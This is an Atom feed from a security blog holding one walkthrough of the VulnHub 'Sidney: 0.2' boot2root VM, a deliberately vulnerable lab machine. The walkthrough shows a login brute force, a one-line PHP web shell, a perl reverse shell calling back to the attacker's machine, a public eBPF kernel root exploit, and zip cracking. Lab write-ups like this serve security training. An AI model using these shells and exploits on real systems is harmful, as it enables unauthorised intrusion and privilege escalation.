@@ -1,0 +1,278 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Ctf | Andrew Emil's blog]]></title>
+  <link href="http://andrewemil.github.io/blog/categories/ctf/atom.xml" rel="self"/>
+  <link href="http://andrewemil.github.io/"/>
+  <updated>2016-06-04T06:29:48-04:00</updated>
+  <id>http://andrewemil.github.io/</id>
+  <author>
+    <name><![CDATA[Andrew Emil]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Sidney: 0.2 Walkthrough]]></title>
+    <link href="http://andrewemil.github.io/blog/2016/06/03/sidney-0-dot-2-walkthrough/"/>
+    <updated>2016-06-03T22:32:43-04:00</updated>
+    <id>http://andrewemil.github.io/blog/2016/06/03/sidney-0-dot-2-walkthrough</id>
+    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/sidney-02,149/">Sidney: 0.2</a> is a boot2root challenge created by <a href="https://twitter.com/@knightmare2600">knightmare2600</a> and hosted by <a href="https://www.vulnhub.com">vulnhub</a>.</p>
+
+<p>After booting the the VM, I used netdiscover to find its IP Address which was 192.168.2.113 and our machine&rsquo;s one was 192.168.2.112.</p>
+
+<h3>Enumeration</h3>
+
+<p>Lets begin by scanning the VM using nmap:</p>
+
+<pre><code class="bash Nmap Scan">root@kali:/# nmap -A -T4 -sV -PN -p- 192.168.2.113
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-06-03 22:59 EDT
+Nmap scan report for 192.168.2.113
+Host is up (0.00090s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: 38911 Bytes Free
+MAC Address: 08:00:27:3C:A8:1C (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.90 ms 192.168.2.113
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
+</code></pre>
+
+<p>So It seems that Apache web service is the only service that was up and running on the target machine, so lets visit its main index page.</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 1.png"></p>
+
+<p>Nothing was interesting here. Then, I used DirBuster to brute force directories and files names on the target web server. A <em>commodore64/</em> directory and <em>commodore64/index.php</em> file were found as show in the figure below:</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 2.png"></p>
+
+<p>By doing a quick search on the <em>commodore64</em> keyword, the <a href="https://en.wikipedia.org/wiki/Commodore_64">Commodore 64 wikipedia page</a> shows that It&rsquo;s an 8-bit home computer introduced in January 1982 by Commodore International.</p>
+
+<p>Ok, lets get back to the dirbuster results. I found that the <em>commodore64/index.php</em> file is actually the login page for a php file manager &ldquo;PHPFM 0.2.3&rdquo;.</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 3.png"></p>
+
+<p>The other result of DirBuster was the <em>commodore64</em> directory where I found a really interesting information in the source code of its page.</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 4.png"></p>
+
+<p>I assumed that the above information was a hint for the login credentials to the PHPFM login page. It stated that the password for <em>robhubbard</em> is the C=64 sound chip lowercase and the format of the password is
+3letters4digits without a space.</p>
+
+<p>By getting back to the <a href="https://en.wikipedia.org/wiki/Commodore_64">Commodore 64 wikipedia page</a>, I found the following information:</p>
+
+<p><em>&ldquo;There are two versions of the SID "Sound Interface Device&rdquo; chip: the 6581 and the 8580. The MOS Technology 6581 was used in the original (&ldquo;breadbox&rdquo;) C64s, the early versions of the 64C, and the Commodore 128. The 6581 was replaced with the MOS Technology 8580 in 1987.&ldquo;</em></p>
+
+<p>Since Commodore64 used &ldquo;MOS Technology 6581/8580 SID chips&rdquo; and the hint I have found stated that the password&rsquo;s format is three lowercase letters and four digits without a space, my initial attempt was to use <em>mos6581</em> and <em>mos8580</em> as the passwords for the user <em>robhubbard</em> to login to the PHPFM, but it failed!</p>
+
+<p>After a little thinking I thought that maybe the 4 digits in the password field weren&rsquo;t the right ones, so my second attempt was to try all the four digits in the range starting from &ldquo;6500 to 6599&rdquo;.</p>
+
+<p>To conduct that brute force attack, I used Burp Suite Intruder attack with the Numbers payload.</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 5.png"></p>
+
+<p>The 4-digits payload <em>6518</em> returned a different response length, and a quick check shows that <em>mos6518</em> was actually the right password for the <em>robhubbard</em> user as shown below. Wonderful!</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 6.png"></p>
+
+<h3>Remote Command Execution</h3>
+
+<p>My next step was to get RCE on the target server by uploading a simple php shell using the PHPFM file manager.</p>
+
+<pre><code class="bash shell.php source code">&lt;?php system($_GET['cmd']); ?&gt;
+</code></pre>
+
+<p>I successfully got RCE using the uploaded script <a href="http://192.168.2.113/commodore64/shell.php?cmd=id">http://192.168.2.113/commodore64/shell.php?cmd=id</a> as shown below:</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 7.png"></p>
+
+<p>After getting the PHPSESSID using Live HTTP headers firefox add-on, I continued exploiting the target using the cURL utility.</p>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 8.png"></p>
+
+<pre><code class="bash RCE">root@kali:~# curl -s --cookie "PHPSESSID=ejn5rmhv9vgamh31ggc4i1o3u4" "http://192.168.2.113/commodore64/shell.php?cmd=$(php -r "echo urlencode('id ;uname -a;pwd;which nc;which wget;which perl;which python');")"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+/var/www/html/commodore64
+/usr/bin/perl
+</code></pre>
+
+<p>Since only perl was installed on the target system, my next step was to get interactive shell using <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a> which is provided by <a href="http://pentestmonkey.net/">pentestmonkey.net</a></p>
+
+<p>Basic modifications in the perl reverse shell:</p>
+
+<pre><code class="bash Modification to the perl-reverse-shell"># Where to send the reverse shell.  Change these.
+my $ip = '192.168.2.112'; #Our kali's ip address
+my $port = 443;
+</code></pre>
+
+<p>After uploading the perl-reverse-shell &ldquo;revshell.pl&rdquo; using the PHPFM file manager, and while listening on port 443 on my local machine, I executed revshell.pl on the target system using the following command:</p>
+
+<pre><code class="bash perl revshell.pl">root@kali:/# curl -s --cookie "PHPSESSID=ejn5rmhv9vgamh31ggc4i1o3u4" "http://192.168.2.113/commodore64/shell.php?cmd=$(php -r "echo urlencode('perl revshell.pl');")"
+</code></pre>
+
+<pre><code class="bash Interactive Shell">root@kali:/# nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.2.112] from (UNKNOWN) [192.168.2.113] 60464
+ 07:12:09 up  3:47,  0 users,  load average: 0.08, 0.04, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/
+/usr/sbin/apache: 0: can't access tty; job control turned off
+$  
+</code></pre>
+
+<h3>Privilege Escalation</h3>
+
+<p>The OS version is Ubuntu 16.04 LTS and its kernel version is 16.04 LTS as shown below:</p>
+
+<pre><code class="bash OS Information">$ uname -a
+Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="16.04 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+UBUNTU_CODENAME=xenial
+$ 
+</code></pre>
+
+<p>This version of Ubuntu 16.04 LTS and its associated kernel 4.4.0-21-generic are suffered from a <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">UAF via double-fdput() in bpf(BPF_PROG_LOAD) error path</a> vulnerability, which can lead to a local root privilege escalation.</p>
+
+<p>The description of the vulnerability report from google project zero states that:
+<em>&ldquo;In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
+kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
+unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
+These conditions are fulfilled in Ubuntu 16.04.&rdquo;</em></p>
+
+<p>Also, an exploit is available with the vulnerability report, and  it&rsquo;s hosted on <a href="https://www.exploit-db.com/exploits/39772/">exploit-db</a> as well.</p>
+
+<p>Once again, I uploaded the exploit &ldquo;exploit.tar&rdquo; to the target server using the PHPFM file manager, extracted the tar file, compiled the exploit &ldquo;./compile.sh&rdquo;, executed the exploit &ldquo;./doubleput&rdquo;, and root privileges were obtained as shown below:</p>
+
+<pre><code class="bash">$ tar -xvf exploit.tar
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+$ cd ebpf_mapfd_doubleput_exploit/
+$ ls
+compile.sh
+doubleput.c
+hello.c
+suidhelper.c
+$ ./compile.sh
+$ ls
+compile.sh
+doubleput
+doubleput.c
+hello
+hello.c
+suidhelper
+suidhelper.c
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+cd /root
+pwd &amp;&amp; ls -la
+/root
+total 84
+drwx------  3 root     root      4096 May 25 18:40 .
+drwxr-xr-x 23 root     root      4096 May 31 20:39 ..
+-rw-r--r--  1 root     root      3106 Oct 22  2015 .bashrc
+dr--------  3 root     root      4096 May 24 21:02 .commodore64
+-rw-r--r--  1 root     root       148 Aug 17  2015 .profile
+-rw-rw-r--  1 rhubbard rhubbard 62464 May 24 21:27 hint.gif
+</code></pre>
+
+<h3>Capturing the flag</h3>
+
+<p>By following the <em>.commodore64</em> directory tree, I found two files under the <em>/root/.commodore64/.miami/vice</em> directory: <em>flag.zip</em> and <em>versatile_commodore_emulator</em>.</p>
+
+<pre><code class="bash">pwd
+/root/.commodore64/.miami/vice
+ls -la
+total 12
+dr-------- 2 root     root     4096 May 25 18:40 .
+dr-------- 3 root     root     4096 May 24 21:01 ..
+-r-------- 1 rhubbard rhubbard 4089 May 24 20:59 flag.zip
+-r-------- 1 root     root        0 May 24 21:02 versatile_commodore_emulator
+</code></pre>
+
+<p>The <em>flag.zip</em> file was password protected, so I copied it to the <em>/var/www/html/</em> directory, hence I can download it to my local machine through the web service.</p>
+
+<pre><code class="bash">cp flag.zip /var/www/html/ 
+chmod 777 /var/www/html/flag.zip
+ls -la /var/www/html
+total 20
+drwxr-xr-x 3 root     root     4096 Jun  4 07:48 .
+drwxr-xr-x 3 root     root     4096 May 23 18:30 ..
+drwxr-xr-x 8 www-data www-data 4096 Jun  4 07:40 commodore64
+-rwxrwxrwx 1 root     root     4089 Jun  4 07:48 flag.zip
+-rw-r--r-- 1 www-data www-data  278 May 24 20:35 index.html
+</code></pre>
+
+<p>Then, I used fcrackzip along with rockyou.txt wordlist to crack the <em>flag.zip</em> password file. The password was successfully found <em>38911</em> as shown below:</p>
+
+<pre><code class="bash">root@kali:~# fcrackzip -v -D -u -p rockyou.txt flag.zip 
+found file 'flag.d64', (size cp/uc   3923/174848, flags 9, chk 9be5)
+checking pw budayday                                
+
+PASSWORD FOUND!!!!: pw == 38911
+root@kali:~# unzip flag.zip
+Archive:  flag.zip
+[flag.zip] flag.d64 password: 
+  inflating: flag.d64                
+root@kali:~# file flag.d64
+flag.d64: D64 Image
+</code></pre>
+
+<p>A quick search shows that D64 Image is a Commodore64 Disk Image, and it can be attached under the <a href="Versatile%20Commodore%20Emulator">Versatile Commodore Emulator</a>. So it appears that the file I have found earlier <em>versatile_commodore_emulator</em> was just a hint that I will need to use that emulator to get the flag.</p>
+
+<p>I downloaded the VICE Emulator <a href="http://vice-emu.sourceforge.net/index.html#download">source code</a>, and found a <a href="http://4digits.net/blog/retrocomputing/commodore-64-emulator-linux.html">tutorial</a> on how to install and use the VICE Emulator.</p>
+
+<p>I used the following commands to install the VICE Emulator on my machine:</p>
+
+<pre><code class="bash Versatile Commodore Emulator Installation">apt-get install vice
+tar vzxf vice-2.4.tar.gz
+cp -r vice-2.4/data/* /usr/lib/vice/
+chown -R root /usr/lib/vice
+</code></pre>
+
+<p>Then I used the <em>x64 flag.d64</em> command to &ldquo;autoload&rdquo; the flag.d64 image from the command line and captured the flag as shown below:</p>
+
+<pre><code class="bash">x64 flag.d64
+</code></pre>
+
+<p><img class="center" src="http://andrewemil.github.io/images/2016/1/image 9.png"></p>
+
+<p>Finally, I would like to thank <a href="https://twitter.com/@knightmare2600">knightmare2600</a> for creating the VM, and <a href="https://www.vulnhub.com">VulnHub</a> for hosting it.</p>
+]]></content>
+  </entry>
+  
+</feed>
